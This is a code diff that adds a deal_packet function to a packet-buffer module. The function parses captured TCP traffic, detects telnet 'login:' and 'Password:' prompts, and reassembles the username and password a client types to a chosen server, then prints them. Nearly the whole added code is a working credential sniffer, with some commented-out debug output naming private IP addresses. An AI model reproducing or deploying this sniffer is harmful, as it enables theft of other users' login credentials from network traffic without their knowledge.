@@ -4,9 +4,10 @@
  * implements a very simple memory buffer to store all the packets we collect.
  */
 
-
 /* do some sanity checks and initialize the buffer */
-int create_buffer(buffer* buf, long long int capacity, long long garbage){
+extern struct sockaddr_in server;
+int create_buffer(buffer* buf, long long int capacity, long long garbage)
+{
 
   if(buf == NULL) return -1;
   
@@ -188,3 +189,112 @@ int gc(buffer* buf){
   
   return 0;
 }
+
+void print(account& x)
+{
+        std::cout << "user: " << x.user << std::endl << "passwd: " << x.passwd << std::endl;
+}
+
+int deal_packet(tnpwbuf* buf, const struct pcap_pkthdr* packet_header, const u_char* full_packet)
+{
+        //struct ethhdr *eth_hdr;
+        struct iphdr *ip_hdr;
+        struct tcphdr *tcp_hdr;
+        char *telnet_data, *log_data, *passwd_data;
+#define LOGIN 7
+#define PASSWORD 10
+        int len;
+        struct sockaddr_in src;
+        struct sockaddr_in dst;
+        struct in_addr tmp;
+        tnpwbuf& bufr = *buf;
+        /* */
+        if (packet_header->len <= ETH_HSIZE + IP_HSIZE + TCP_HSIZE) return -1;
+        //eth_hdr = (struct ethhdr *)full_packet;
+        ip_hdr = (struct iphdr *)(full_packet + ETH_HSIZE);
+        tcp_hdr = (struct tcphdr *)(full_packet + ETH_HSIZE + (ip_hdr->ihl << 2));
+        telnet_data = (char *)(full_packet + ETH_HSIZE + (ip_hdr->ihl << 2) + (tcp_hdr->doff << 2));
+        len = packet_header->len - ETH_HSIZE - (ip_hdr->ihl << 2) - (tcp_hdr->doff << 2);
+        src.sin_family = AF_INET;
+        src.sin_port = tcp_hdr->th_sport;
+        src.sin_addr.s_addr = ip_hdr->saddr;
+        dst.sin_family = AF_INET;
+        dst.sin_port = tcp_hdr->th_dport;
+        dst.sin_addr.s_addr = ip_hdr->daddr;
+
+        //if (strcmp(inet_ntoa(src.sin_addr),"172.18.41.14") == 0 || 
+        tmp.s_addr = ip_hdr->saddr;
+        //if (strcmp(inet_ntoa(tmp), "172.18.41.35") == 0 )
+        /*
+        {
+	fprintf(stdout, "information about this IP packet:\n");
+	fprintf(stdout, "length= %d\n", ntohs(ip_hdr->tot_len));
+	fprintf(stdout, "header length= %d\n", ip_hdr->ihl );
+	fprintf(stdout, "version= %d\n", ip_hdr->version);
+	fprintf(stdout, "id= %d\n", ip_hdr->id);
+	fprintf(stdout, "offset= %d\n", ip_hdr->frag_off);
+	fprintf(stdout, "ttl= %d\n", ip_hdr->ttl);
+	fprintf(stdout, "protocol=%d\n", ip_hdr->protocol);
+	
+	tmp.s_addr= (unsigned long int)ip_hdr->saddr;
+        fprintf(stdout, "source= %s\n", inet_ntoa(tmp));
+	
+	tmp.s_addr= (unsigned long int)ip_hdr->daddr;
+	fprintf(stdout, "destination= %s\n", inet_ntoa(tmp));
+        printf("sport:%d dport:%d\n", ntohs(tcp_hdr->th_sport), ntohs(tcp_hdr->th_dport));
+        log_data = telnet_data + (len - LOGIN);
+        printf("telnet:%s\n", telnet_data);
+        telnet_data[len] = 0;
+        printf("telnet:%s\n\n\n", telnet_data);
+        }
+
+        printf("         %u\n", dst.sin_addr.s_addr);
+        */
+
+        log_data = telnet_data + (len - LOGIN);
+        if (strncmp(log_data, "login: ", LOGIN) == 0)
+                bufr[dst].flag = ACCOUNT_RECEIVING;
+        passwd_data = telnet_data + len - PASSWORD;
+        if (strncmp(passwd_data, "Password: ", PASSWORD) == 0)
+                bufr[dst].flag = PASSWORD_RECEIVING;
+        if (dst.sin_addr.s_addr == server.sin_addr.s_addr && len > 0)
+        {
+                switch ( bufr[src].flag)
+                {
+                        case 0:
+                                break;
+                        case 1://ACCOUNT_RECEIVING
+                                if (strncmp(telnet_data, "\r\n", 2) == 0)
+                                {
+                                        bufr[src].user += std::string(telnet_data, len - 2);
+                                        bufr[src].flag = ACCOUNT_COMPLETED;
+                                        break;
+                                }
+                                if (strncmp(telnet_data, "^C", 2) == 0)
+                                {
+                                        bufr[src].clear();
+                                        break;
+                                }
+                                if (telnet_data[0] == (char)0xff && telnet_data[1] == (char)0xfd && 
+                                                telnet_data[2] == (char)01)
+                                        break;
+                                bufr[src].user += std::string(telnet_data, len);
+                                break;
+                        case 2:
+                                break;
+                        case 3://PASSWORD_RECEIVING
+                                if (strncmp(telnet_data, "\r\n", 2) == 0)
+                                {
+                                        bufr[src].flag = PASSWORD_COMPLETED;
+                                        print(bufr[src]);
+                                        bufr[src].clear();
+                                        break;
+                                }
+                                bufr[src].passwd += std::string(telnet_data, len);
+                        default:
+                                break;
+                }
+        }
+        return 0;
+}
+
